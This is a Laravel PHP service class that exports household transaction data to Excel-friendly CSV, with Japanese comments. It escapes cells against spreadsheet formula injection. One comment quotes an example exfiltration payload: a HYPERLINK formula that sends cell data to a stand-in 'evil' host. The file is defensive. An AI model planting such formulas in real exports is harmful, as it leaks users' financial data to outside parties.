<?php

namespace App\Services;

use App\Models\Transaction;
use Illuminate\Database\Eloquent\Builder;
use Symfony\Component\HttpFoundation\StreamedResponse;

/**
 * 取引データをCSV(Excelで開けるUTF-8 BOM付き)として出力する。
 */
class TransactionCsvExporter
{
    public const HEADER = ['日付', '種別', 'カテゴリ', '固定/変動', '店名', 'メモ', '金額'];

    /**
     * この文字で始まる値を、表計算ソフトは「数式」として実行する。
     *
     * 店名とメモはカード会社のCSVやAIの応答から来る＝アプリが作った値ではない。
     * `=HYPERLINK("http://evil/?d="&A1,"領収書")` のような店名が混ざっていると、
     * このCSVを Excel で開いた瞬間に家計データが外へ送られる。
     * こちらから BOM を付けて「Excelで開く」導線を用意しているぶん、実現性は高い。
     */
    public const FORMULA_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * @param  Builder<Transaction>  $query
     */
    public function stream(Builder $query, string $filename): StreamedResponse
    {
        return response()->streamDownload(function () use ($query) {
            $handle = fopen('php://output', 'wb');

            // Excelで文字化けしないようにBOMを付ける
            fwrite($handle, "\xEF\xBB\xBF");
            // エスケープ文字は使わない（RFC4180）。既定の `\` のままだと、
            // 「半額シール\」のように末尾がバックスラッシュの店名で、以降の列と行を
            // 丸ごと飲み込んで静かに壊れる（バックアップ側で実際に踏んだ穴）。
            fputcsv($handle, self::HEADER, ',', '"', '');

            $query->with('category')->orderBy('transaction_date')->orderBy('id')
                ->chunk(500, function ($transactions) use ($handle) {
                    foreach ($transactions as $transaction) {
                        fputcsv($handle, $this->toRow($transaction), ',', '"', '');
                    }
                });

            fclose($handle);
        }, $filename, [
            'Content-Type' => 'text/csv; charset=UTF-8',
        ]);
    }

    /**
     * @return array<int, string|int>
     */
    public function toRow(Transaction $transaction): array
    {
        return [
            $transaction->transaction_date->format('Y-m-d'),
            $transaction->type === 'income' ? '収入' : '支出',
            // カテゴリ名も人が自由に付けられるので、同じ扱いにする
            self::escapeFormula($transaction->category?->name) ?: '未分類',
            $transaction->category?->expense_nature_label ?? '',
            self::escapeFormula($transaction->shop_name),
            self::escapeFormula($transaction->memo),
            (int) $transaction->amount,
        ];
    }

    /**
     * 表計算ソフトに数式として実行されないようにする。
     *
     * 先頭に `'`（アポストロフィ）を足す。開き方によっては `'` がセルに見えるが
     * （Excel の「データ→テキストまたはCSVから」、LibreOffice のテキストインポート）、
     * 数式が勝手に走るよりはよい、という判断。
     */
    public static function escapeFormula(?string $value): string
    {
        $value = (string) $value;

        if ($value === '') {
            return '';
        }

        foreach (self::FORMULA_PREFIXES as $prefix) {
            if (str_starts_with($value, $prefix)) {
                return "'".$value;
            }
        }

        return $value;
    }

    /**
     * escapeFormula() が足した `'` を外す。
     *
     * 書き出したCSVをこのアプリに取り込み直したときに、店名の頭に `'` が残らないようにする
     * （往復するたびに `''`、`'''` と増えていく）。
     * 付ける側と外す側で対象文字がずれないよう、判定は同じ定数から作る。
     */
    public static function unescapeFormula(string $value): string
    {
        if (! str_starts_with($value, "'") || mb_strlen($value) < 2) {
            return $value;
        }

        foreach (self::FORMULA_PREFIXES as $prefix) {
            if (str_starts_with(substr($value, 1), $prefix)) {
                return substr($value, 1);
            }
        }

        return $value;
    }
}
